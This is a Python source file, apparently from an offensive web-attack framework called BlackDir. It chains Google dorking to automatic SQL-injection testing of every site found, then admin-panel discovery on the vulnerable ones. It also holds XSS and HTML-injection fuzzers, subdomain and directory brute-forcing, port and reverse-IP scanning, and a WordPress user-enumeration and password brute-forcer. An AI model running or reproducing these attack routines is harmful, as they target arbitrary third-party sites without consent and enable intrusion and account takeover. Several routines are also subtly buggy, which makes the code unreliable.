import json
import os
import time
import urllib.parse as urlparse
from contextlib import suppress
from hashlib import *
from socket import gethostbyname
from urllib import request
from urllib.parse import urlsplit, parse_qs

import requests
from bs4 import BeautifulSoup

from constants import result_dict
from paths import LINK_TXT_PATH, XSS_PAYLOADS_PATH, HTML_PAYLOADS_PATH, SITE_FROM_DORK_PATH, PASSWORD_TXT_PATH, \
    USERNAME_TXT_PATH


def fast_crawl(url):
    global list_direct, url_access, url_source
    ip = url.strip("https://www.")

    print("Domain:", url)
    with suppress(Exception):
        ip = gethostbyname(ip)

    print("IP:", ip)

    list_direct = []
    url_strip = url.strip("https://www.")
    headers = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"}
    list_direct.append(url)

    url_request = requests.get(url, headers=headers)
    url_source = BeautifulSoup(url_request.content, "html.parser")

    if "urls_response" not in result_dict:
        result_dict["urls_response"] = []

    for link in url_source.find_all("a"):
        link_pure = link.get("href")

        try:
            if "#" in link_pure or "../" in link_pure or "facebook.com" in link_pure or "@" in link_pure:
                pass
            else:
                if "http" not in link_pure and "https" not in link_pure and url_strip not in link_pure:

                    try:
                        first_req = requests.get(url + link_pure)
                        if first_req.status_code == 200:
                            result_dict["urls_response"].append({
                                "url": url + link_pure,
                                "response": first_req.status_code,
                            })

                            print("================================================================")
                            print("Url:", url + link_pure)
                            print("Request:", first_req.status_code)
                            print("================================================================")

                            list_direct.append(url + link_pure)

                    except requests.exceptions.ConnectionError as e:
                        print("Error in fast_crawl", {e})

                else:
                    if "http" in link_pure or "https" in link_pure and url_strip in link_pure:
                        try:
                            sec_req = requests.get(link_pure)
                            if sec_req.status_code == 200:
                                if sec_req.url not in list_direct:
                                    result_dict["urls_response"].append({
                                        "url": link_pure,
                                        "response": sec_req.status_code,
                                    })

                                    print("================================================================")
                                    print("Url:", link_pure)
                                    print("Request:", sec_req.status_code)
                                    print("================================================================")

                                    list_direct.append(link_pure)

                        except requests.exceptions.ConnectionError as e:
                            print("Error in fast_crawl", {e})

                    elif "http" not in link_pure or "https" not in link_pure and url_strip in link_pure:

                        try:
                            third_req = requests.get("http://" + link_pure)
                            if third_req.status_code == 200:
                                if third_req.url not in list_direct:
                                    result_dict["urls_response"].append({
                                        "url": third_req.url,
                                        "response": third_req.status_code,
                                    })

                                    print("================================================================")
                                    print("Url:", third_req.url)
                                    print("Request:", third_req.status_code)
                                    print("================================================================")

                                    list_direct.append("http://" + link_pure)

                        except requests.exceptions.ConnectionError as e:
                            print("Error in fast_crawl", {e})

                    else:
                        try:
                            fourth_req = requests.get(link_pure)
                            if fourth_req.status_code == 200:
                                if fourth_req.url not in list_direct:
                                    result_dict["urls_response"].append({
                                        "url": fourth_req.url,
                                        "response": fourth_req.status_code,
                                    })

                                    print("================================================================")
                                    print("Url:", fourth_req.url)
                                    print("Request:", fourth_req.status_code)
                                    print("================================================================")

                                    list_direct.append(fourth_req.url)
                        except requests.exceptions.ConnectionError as e:
                            print("Error in fast_crawl", {e})
        except Exception as e:
            print("Error in fast_crawl", {e})

    for url_form_list in list_direct:
        sec_url_request = requests.get(url_form_list)
        soup = BeautifulSoup(sec_url_request.content, "html.parser")

        for sec_link in soup.find_all("a"):
            sec_link = sec_link.get("href")

            try:
                if "#" in sec_link or "./" in sec_link:
                    pass
                else:
                    if url_strip not in sec_link:
                        pass
                    else:
                        if "http" not in sec_link or "https" not in sec_link and url_strip in sec_link:

                            try:
                                five_req = requests.get("http://" + sec_link)

                                if five_req.status_code == 200:
                                    if five_req.url not in list_direct:
                                        result_dict["urls_response"].append({
                                            "url": five_req.url,
                                            "response": five_req.status_code,
                                        })

                                        print("================================================================")
                                        print("Url:", five_req.url)
                                        print("Request:", five_req.status_code)
                                        print("================================================================")

                                        list_direct.append(five_req.url)

                            except Exception as e:
                                print("Error in fast_crawl", {e})

                        else:

                            try:
                                six_req = requests.get(sec_link)

                                if six_req.status_code == 200:
                                    if six_req.url not in list_direct:
                                        result_dict["urls_response"].append({
                                            "url": six_req.url,
                                            "response": six_req.status_code,
                                        })

                                        print("================================================================")
                                        print("Url:", six_req.url)
                                        print("Request:", six_req.status_code)
                                        print("================================================================")

                                        list_direct.append(six_req.url)

                            except Exception as e:
                                print("Error in fast_crawl", {e})
            except Exception as e:
                print("Error in fast_crawl", {e})


def admin_panel(url):
    file_fromat = open(LINK_TXT_PATH, "r")
    if "urls_found" not in result_dict:
        result_dict["urls_found"] = []

    try:
        for link in file_fromat:
            Purl = url + "/" + link
            if Purl is None:
                exit()
            req_link = requests.get(Purl)
            if req_link.status_code == 200:
                result_dict["urls_found"].append({"url": Purl})
                print("[+]Found: ", Purl)
            else:
                if "urls_not_found" not in result_dict:
                    result_dict["urls_not_found"] = []
                result_dict["urls_not_found"].append({"url": Purl})
                print("[-]Not Found: ", Purl)
    except requests.exceptions.ConnectionError as e:
        print("Error in admin_panel", {e})


def sql(url):  # Function F0r find Sql_Injection
    if "sql" not in result_dict:
        result_dict["sql"] = []

    try:
        parametrs = []
        after_eq = []
        get = {}
        query = urlsplit(url).query
        dictonary = parse_qs(query)
        key = list(dictonary.keys())
        value = list(dictonary.values())
        for par in key:
            parametrs.append(par)
        for equal in value:
            for number in equal:
                after_eq.append(number + "'")
        for pars in parametrs:
            for eq in after_eq:
                get = {pars: eq}
        get_list = list(get)

        for item in get_list:
            item = item.strip()
            if item is not None:
                req = requests.get(url, params=get)

                if ("Warning" in req.text or "Database error" in req.text or "MySQL error" in req.text
                        or "SQL syntax" in req.text):

                    vulnerable = f"Yes, {req.url}"
                    print("================================================================")
                    print("SQL Injection:", "Type:Union Based")
                    print("Url Vulnerable:", req.url)
                    print("================================================================")
                    url_sql.append(req.url)

                else:

                    vulnerable = f"No, {req.url}"
                    print("================================================================")
                    print("Url Not Vulnerable:", req.url)
                    print("================================================================")

                result_dict["sql"].append({"url": item, "vulnerable": vulnerable})

    except Exception as e:
        print("Error in sql", {e})


def xss(url):  # Function FOr Find xss vulnerability
    if "xss" not in result_dict:
        result_dict["xss"] = []

    # GET Method
    try:
        GET = {}
        file = open(XSS_PAYLOADS_PATH, "r")
        parsed = urlparse.urlparse(url)
        params = urlparse.parse_qsl(parsed.query)
        print("Parameters in Link:", params)
        print("Please wait we check if parameters vulnerable ")
        time.sleep(5)

        for payload in file:
            payload = payload.strip()
            for par, equeal in params:
                GET = {par: payload}
                check_req = requests.get(url, params=GET)

                if payload in check_req.text:
                    time.sleep(2)
                    print("=========================================================")
                    print("Url:", url)
                    print("Method:", "GET")
                    print("Url Vulnerable:", check_req.url)
                    print("Parameter Vulnerable:", par)
                    print("Payload:", payload)
                    print("=========================================================")

                    result_dict["xss"].append({
                        "url": url,
                        "method": "GET",
                        "vulnerable": check_req.url,
                        "parameter_vulnerable": f"Yes: {par}",
                        "payload": payload,
                    })

                else:
                    time.sleep(2)
                    print("=========================================================")
                    print("Url:", url)
                    print("Method:", "GET", )
                    print("Url Not Vulnerable:", check_req.url)
                    print("parameter_vulnerable", "Nothing vulnerable")
                    print("Payload:", payload)
                    print("=========================================================")

                    result_dict["xss"].append({
                        "url": url,
                        "method": "GET",
                        # "vulnerable": check_req.url,
                        #                         "parameter_vulnerable": f"No, {par}",
                        "payload": payload,
                    })

        file.close()
    except Exception as e:
        print("Error in xss", {e})

    # Post Method
    try:
        POST = {}
        New_open = open(XSS_PAYLOADS_PATH)
        request_form = request.urlopen(url).read()
        source = BeautifulSoup(request_form, "html.parser")

        for payloads in New_open:
            for form in source.findAll("input"):
                if form.get('type') == "submit":
                    input_submit = form.get('name')
                    POST[input_submit] = payloads
                if form.get('type') == 'text':
                    input_name = form.get('name')
                    POST[input_name] = payloads
            sec_check_req = requests.post(url, POST)
            if payloads in sec_check_req.text:
                time.sleep(2)

                print("=========================================================")
                print("Url:", url)
                print("Method:", "POST")
                print("Url Vulnerable:", sec_check_req.url)
                print("Parameter Vulnerable:", input_name)
                print("Payload:", payloads)
                print("=========================================================")

                result_dict["xss"].append({
                    "url": url,
                    "method": "POST",
                    "vulnerable": sec_check_req.url,
                    "parameter_vulnerable": f"Yes: {input_name}",
                    "payload": payloads,
                })

            else:
                time.sleep(2)

                is_in_dict = False
                for item in result_dict["xss"]:
                    if item["url"] == url:
                        is_in_dict = True

                if not is_in_dict:
                    print("=========================================================")
                    print("Url:", url)
                    print("Method:", "POST")
                    print("Url Not Vulnerable:", sec_check_req.url)
                    # print("Parameter Not Vulnerable:")
                    print("=========================================================")

                    result_dict["xss"].append({
                        "url": url,
                        "method": "POST",
                        # "vulnerable": sec_check_req.url,
                        "parameter_vulnerable": "Nothing vulnerable",
                    })

        New_open.close()
    except Exception as e:
        print("Error in xss", {e})


def httplive(url):
    global live
    live = None
    bool(live)
    try:
        request_live = requests.get(url)
        if request_live.status_code == 200:
            print("Http Live : ", url)
            live = 1
    except requests.exceptions.ConnectionError as e:
        print("Http Down : ", url)
        print("Error in http live", {e})
        live = 0


def spider(url, lists, secure):
    if "spider" not in result_dict:
        result_dict["spider"] = []

    print("Please Wait We Check if URL Live or Down . . ")
    time.sleep(3)
    httplive(url)
    if live == 1:
        if secure == "list.txt":
            print("Please Wait We Spider all Directories . .")
            time.sleep(3)
            fast_crawl(url)
            print("We Crawling By This File >>" + os.getcwd() + "/" + "list.txt")

            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    result_dict["spider"].append({"url": response.url, "status_code": 200})
                    print("\x1b[32mFound[+]")
                    print(response.url)
        else:
            fast_crawl(url)
            print("We Crawling By This File >>" + lists)  # listuser

            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    result_dict["spider"].append({"url": response.url, "status_code": 200})

                    print("\x1b[32mFound[+]")
                    print(response.url)


def html_injection(url):
    if "html_injection" not in result_dict:
        result_dict["html_injection"] = []

    # GET
    try:
        file = open(HTML_PAYLOADS_PATH, "r")
        GET = {}
        parsed = urlparse.urlparse(url)
        params = urlparse.parse_qsl(parsed.query)

        for payload in file:
            payload = payload.strip()
            for par, equal in params:
                print(par, "=", equal)
                GET = {par: payload}
                req = requests.get(url, params=GET)
                if payload in req.text:
                    print("=========================================================")
                    print("Url:", url)
                    print("Method:", "GET")
                    print("Url Vulnerable:", req.url)
                    print("Parameter:", par)
                    print("Payload:", payload)
                    print("=========================================================")

                    result_dict["html_injection"].append({
                        "url": url,
                        "method": "GET",
                        "vulnerable": req.url,
                        "parameter": par,
                        "payload": payload,
                    })

        file.close()

    except Exception as e:
        print(f"Error in html_injection, {e}")

    # POST
    try:
        input_name = None
        POST = {}
        file_payloads = open(HTML_PAYLOADS_PATH)
        request_form = request.urlopen(url).read()
        source = BeautifulSoup(request_form, "html.parser")

        for payload in file_payloads:
            for form in source.findAll("input"):
                if form.get('type') == "submit":
                    input_submit = form.get('name')
                    POST[input_submit] = payload
                if form.get('type') == 'text':
                    input_name = form.get('name')
                    POST[input_name] = payload
            req_check = requests.post(url, POST)

            if payload in req_check.text:
                print("=========================================================")
                print("Url:", url)
                print("Method:", "POST")
                print("Url Vulnerable:", req_check.url)
                print("Parameter:", input_name)
                print("Payload:", payload)
                print("=========================================================")

                result_dict["html_injection"].append({
                    "url": url,
                    "method": "POST",
                    "vulnerable": req_check.url,
                    "parameter": input_name,
                    "payload": payload,
                })

        file_payloads.close()
    except Exception as e:
        print(f"Error in html_injection, {e}")


def dorks(dork, country, text):  # function for Get Dork
    global url_sql
    url_sql = []

    print("Please Wait .. ")
    if country and not text:
        docker = "inurl:" + dork + " site:" + country
    elif not country and text:
        docker = "inurl:" + dork + " intext:" + text
    elif country and text:
        docker = "inurl:" + dork + " site:" + country + " intext:" + text
    else:
        docker = "inurl:" + dork

    list_of_url = []
    results = []
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    link = "https://google.com/search?q=" + docker
    rep = requests.get(link, headers=headers)

    if rep.status_code == 200:
        soup = BeautifulSoup(rep.content, "html.parser")
    for g in soup.find_all('div', class_='r'):
        anchors = g.find_all('a')
        if anchors:
            link = anchors[0]['href']
            title = g.find('h3').text
            item = {
                "title": title,
                "link": link
            }
            results.append(item)

    for dic in results:
        list_of_link = list(dic.values())
        print("\n")
        print("Title Of Link:", list_of_link[0], "\n")
        print("Link:", list_of_link[1], "\n")
        list_of_url.append(list_of_link[1])

    file_dork = open(SITE_FROM_DORK_PATH, "w")
    for url_find in list_of_url:
        file_dork.write(url_find + "\n")
    file_dork.close()
    print("All Site Save On: ", os.getcwd() + "/" + "Site_From_Dork.txt")

    for urls in list_of_url:
        sql(urls)

    if url_sql != []:
        for url_find in url_sql:
            url_find = url_find.strip("https://www.")
            url_find = url_find[0:url_find.index("/")]
            url_find = "http://" + url_find

            try:
                file_admin = open(LINK_TXT_PATH, "r")
                for direct in file_admin:
                    direct = direct.strip()
                    req_admin = requests.get(url_find + "/" + direct)
                    if req_admin.status_code == 200:
                        print("[+] Found : {0}").format(req_admin.url)
                    else:
                        print("[-] Not Found : {0}").format(req_admin.url)
            except requests.exceptions.ConnectionError as e:
                print(f"Error in dorks, {e}")


def list_dorks(file):
    if "list_dorks" not in result_dict:
        result_dict["list_dorks"] = []

    handle = open(file, "r")
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    result = []
    url_hand = []

    for dork in handle:
        print("========================================")
        print("Dork:", dork)
        print("========================================")
        result_dict["list_dorks"].append({"dork": dork})

        time.sleep(2)
        link = "https://google.com/search?q=" + dork
        rep = requests.get(link, headers=headers)

        if rep.status_code == 200:
            soup = BeautifulSoup(rep.content, "html.parser")

        for g in soup.find_all('div', class_='r'):
            anchors = g.find_all('a')
            if anchors:
                link = anchors[0]['href']
                title = g.find('h3').text
                item = {
                    "title": title,
                    "link": link
                }
                result.append(item)
                for dict in result:
                    list_link = list(dict.values())
                    print("\n")
                    print("Title Of Link:", list_link[0], "\n")
                    print("Link:", list_link[1], "\n")
                    url_hand.append(list_link[1])

    for urls in url_hand:
        sql(urls)


def sub(url, subs):  # function for gussing subdomain
    if "sub" not in result_dict:
        result_dict["sub"] = []

    if "https" in url:
        http_or_https = "https://"
        url = url.strip(http_or_https)

    elif "http" in url:
        http_or_https = "http://"
        url = url.strip(http_or_https)

    for i in subs:
        i = i.strip()
        Purl = i + "." + url
        try:
            time.sleep(1)
            url = http_or_https + Purl
            response = requests.get(url)
            if response.status_code == 200:
                print("=========================================================")
                print(f"Url: {url}")
                print("Status_Code:", 200)
                print("=========================================================")

                result_dict["sub"].append({"url": url, "status_code": 200})

        except Exception as e:
            print("Error in sub", e)


def ip_reverse(ip):
    if "ip_reverse" not in result_dict:
        result_dict["ip_reverse"] = []

    try:
        url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
        print("url", url)
        print("ip", ip)
        req = requests.get(url)
        response = req.text
        print(response)

    except requests.exceptions.ConnectionError as e:
        print("Error in ip_reverse", e)
        response = "Connection Fail"

    result_dict["ip_reverse"].append({"ip": ip, "response": str(response)})


def scanports(ip):
    if "scan_ports" not in result_dict:
        result_dict["scan_ports"] = []

    try:
        api = "https://api.hackertarget.com/nmap/?q="
        new_api = api + ip
        req_api = requests.get(new_api)

        print(req_api.text)
        result_dict["scan_ports"] = req_api.text
    except Exception as e:
        print("Error in scan_ports", e)


def update():
    os.system(
        "cd .. && rm -rf BlackDir-Framework-New && mkdir BlackDir-Framework-New && cd BlackDir-Framework-New && git clone https://github.com/RedVirus0/BlackDir-Framework.git && echo 'New Directory >> ' && pwd")


def hash_en(word, hash_type):
    if "hash_en" not in result_dict:
        result_dict["hash_en"] = []

    word = word.strip()
    hash_type = hash_type.strip()
    if hash_type == "md5":
        word = md5(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "sha1":
        word = sha1(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "sha256":
        word = sha256(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "sha512":
        word = sha512(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "sha224":
        word = sha224(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "sha384":
        word = sha384(word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)
    elif hash_type == "md4":
        word = new('md4', word.encode()).hexdigest()
        print("Type: ", hash_type)
        print("Hash :", word)

    result_dict["hash_en"].append({"type": hash_type, "hash": word})


def hash_identifier(hashing):
    if "hash_identifier" not in result_dict:
        result_dict["hash_identifier"] = []

    hashing = hashing.strip()
    hash_type, bit_length = None, None

    if len(hashing) == 32:
        hash_type = "md5 or md4"
        bit_length = 32 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    elif len(hashing) == 40:
        hash_type = "sha1"
        bit_length = 40 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    elif len(hashing) == 64:
        hash_type = "sha256"
        bit_length = 64 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    elif len(hashing) == 96:
        hash_type = "sha384"
        bit_length = 96 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    elif len(hashing) == 56:
        hash_type = "sha224"
        bit_length = 56 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    elif len(hashing) == 128:
        hash_type = "sha512"
        bit_length = 128 * 4
        print("Hash Type:", hash_type)
        print("Bit length:", bit_length)
    else:
        print("Not Found !")

    if hash_type and bit_length:
        result_dict["hash_identifier"].append({"type": hash_type, "bit_length": bit_length})


def enumerate(url):
    try:
        req_check = requests.get(url)
        if req_check.status_code == 200:
            u_json = json.loads(req_check.text)
            for x in range(0, len(u_json)):
                user = u_json[x]['slug']
            return user
        else:
            return None
    except requests.exceptions.ConnectionError as e:
        print("Error in enumerate", e)
        return None


def wordpress(url, username, password, enum):
    if "users_by_wordpress" not in result_dict:
        result_dict["users_by_wordpress"] = []

    user_list = []
    send = {}
    user = None
    user_json = url + "/wp-json/wp/v2/users"
    print("[!] Start Brute Force")

    time.sleep(2)
    if enum == "use" or "Use":
        user = enumerate(user_json)
        print("[!] Start Enumeration")

    if user is not None and password is None:
        user_list.append(user)
        print("[+] Found User:", user)
        p_file = open(PASSWORD_TXT_PATH, "r")
        print("File For Passwords:", os.getcwd() + "/" + "password.txt")
    elif user is not None and password is not None:
        user_list.append(user)
        print("[+] Found User:", user)
        p_file = open(password, "r")
        print("File For Passwords:", password)

    else:
        if username is None and password is None:
            user_list = open(USERNAME_TXT_PATH, "r")
            p_file = open(PASSWORD_TXT_PATH, "r")
            print("File For Users:", os.getcwd() + "/" + "username.txt")
            print("File For Passwords:", os.getcwd() + "/" + "password.txt")
        elif username is not None and password is None:
            user_list = open(username, "r")
            p_file = open(PASSWORD_TXT_PATH, "r")
            print("File For Users:", username)
            print("File For Passwords:", os.getcwd() + "/" + "password.txt")
        elif username is None and password is not None:
            user_list = open(USERNAME_TXT_PATH, "r")
            p_file = open(password, "r")
            print("File For Users:", os.getcwd() + "/" + "username.txt")
            print("File For Passwords:", password)
        else:
            user_list = open(username, "r")
            p_file = open(password, "r")
            print("File For Users:", username)
            print("File For Users:", password)

    time.sleep(2)

    if url.endswith('/'):
        add = ''
    else:
        add = '/'

    url_edit = url + add + "wp-login.php"
    wp_admin = url + add + "wp-admin"

    url_req = requests.post(url_edit)
    if url_req.status_code == 200:
        for usernames in user_list:
            usernames = usernames.strip()
            for passowrds in p_file:
                passowrds = passowrds.strip()
                url_source = BeautifulSoup(url_req.content, "html.parser")

                for url_input in url_source.find_all("input"):
                    if url_input.get("type") == "text":
                        input_text_name = url_input.get("name")
                        send[input_text_name] = usernames
                    if url_input.get("type") == "password":
                        input_password_name = url_input.get("name")
                        send[input_password_name] = passowrds
                    if url_input.get("type") == "submit":
                        input_submit_name = url_input.get("name")
                        input_submit_value = url_input.get("value")
                        send[input_submit_name] = input_submit_value
                with requests.Session() as sessions:
                    headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
                    sessions.post(url_edit, headers=headers1, data=send)
                    response = sessions.get(wp_admin)

                if url + "/wp-login.php?action=lostpassword" not in response.text:
                    result_dict["users_by_wordpress"].append({
                        "username": username, "password": passowrds, "found": True
                    })
                    print("Found !", "Username:", usernames, "password:", passowrds)
                    # exit(0) continue scan even if user is found
                else:
                    print("Not Found !", "Username:", usernames, "password:", passowrds)
                    result_dict["users_by_wordpress"].append({
                        "username": username, "password": passowrds, "found": False
                    })

    else:
        print("URL is Wrong !")
